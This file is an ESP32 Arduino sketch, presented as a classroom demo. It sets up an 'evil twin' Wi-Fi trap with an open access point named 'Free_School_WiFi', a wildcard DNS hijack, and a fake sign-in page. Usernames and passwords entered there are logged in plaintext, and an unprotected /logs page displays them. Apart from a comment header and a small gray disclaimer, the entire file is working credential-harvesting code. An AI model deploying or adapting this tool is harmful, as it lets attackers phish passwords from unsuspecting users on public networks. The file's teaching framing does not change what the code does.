// evil_twin_demo.ino
// Educational rogue AP / captive portal demo — classroom use only, with student consent.

#include <WiFi.h>
#include <DNSServer.h>
#include <WebServer.h>
#include <SPIFFS.h>

const char* ap_ssid = "Free_School_WiFi"; // consider a real-sounding but non-impersonating name
DNSServer dnsServer;
WebServer webServer(80);

const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 4, 1);

// --- Logging helper ---
void logEvent(String info) {
  File f = SPIFFS.open("/log.txt", FILE_APPEND);
  if (f) {
    f.println(info);
    f.close();
  }
  Serial.println(info);
}

// --- Fake login page shown to every connecting device ---
void handlePortal() {
  String ip = webServer.client().remoteIP().toString();
  logEvent("PORTAL VIEW from " + ip + " requested host: " + webServer.hostHeader());

  String html = R"(
    <html><head><title>Wi-Fi Login Required</title></head>
    <body style="font-family:sans-serif;text-align:center;margin-top:50px;">
      <h2>Free School WiFi</h2>
      <p>Please sign in to continue.</p>
      <form action="/submit" method="POST">
        <input type="text" name="username" placeholder="Username"><br><br>
        <input type="password" name="password" placeholder="Password"><br><br>
        <input type="submit" value="Connect">
      </form>
      <p style="font-size:12px;color:gray;">This is a classroom cybersecurity demo. Do not enter real credentials.</p>
    </body></html>
  )";

  webServer.send(200, "text/html", html);
}

// --- Handle fake form submission ---
void handleSubmit() {
  String ip = webServer.client().remoteIP().toString();
  String user = webServer.arg("username");
  String pass = webServer.arg("password");

  // Log what was submitted (students should only enter fake/test data)
  logEvent("SUBMIT from " + ip + " | username=" + user + " | password=" + pass);

  webServer.send(200, "text/html",
    "<h3>Connection failed. Please try again.</h3><a href='/'>Back</a>");
}

// --- Show collected logs (for classroom review) ---
void handleLogs() {
  File f = SPIFFS.open("/log.txt", FILE_READ);
  String content = "No logs yet.";
  if (f) {
    content = f.readString();
    f.close();
  }
  webServer.send(200, "text/plain", content);
}

void setup() {
  Serial.begin(115200);
  SPIFFS.begin(true);

  // Start open (unencrypted) access point
  WiFi.mode(WIFI_AP);
  WiFi.softAP(ap_ssid); // no password = open network, like real "free wifi" traps

  // DNS server answers every query with the ESP32's own IP
  dnsServer.start(DNS_PORT, "*", apIP);

  // Any path requested gets redirected to the fake portal
  webServer.onNotFound(handlePortal);
  webServer.on("/", handlePortal);
  webServer.on("/submit", HTTP_POST, handleSubmit);
  webServer.on("/logs", handleLogs); // teacher/student review page

  webServer.begin();
  logEvent("=== New session started ===");
}

void loop() {
  dnsServer.processNextRequest();
  webServer.handleClient();
}
